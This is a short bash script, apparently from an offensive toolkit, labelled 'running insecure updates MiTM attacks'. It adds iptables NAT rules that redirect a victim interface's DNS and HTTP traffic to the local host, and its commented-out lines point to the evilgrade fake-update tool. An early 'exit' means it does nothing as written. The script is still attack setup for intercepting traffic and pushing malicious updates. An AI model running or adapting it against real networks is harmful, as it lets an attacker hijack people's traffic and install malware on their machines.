#!/bin/bash

exit
echo 'running insecure updates MiTM attacks'

[[ $(iptables -t nat -vnL PREROUTING | grep "$1" | grep 53) = '' ]] && {
  iptables -t nat -A PREROUTING -i "$1" -p udp --dport 53 -j REDIRECT --to-ports 53
}
[[ $(iptables -t nat -vnL PREROUTING | grep "$1" | grep 80) = '' ]] && {
  iptables -t nat -A PREROUTING -i "$1" -p tcp --dport 80 -j REDIRECT --to-ports 80
}

#sudo evilgrade
#start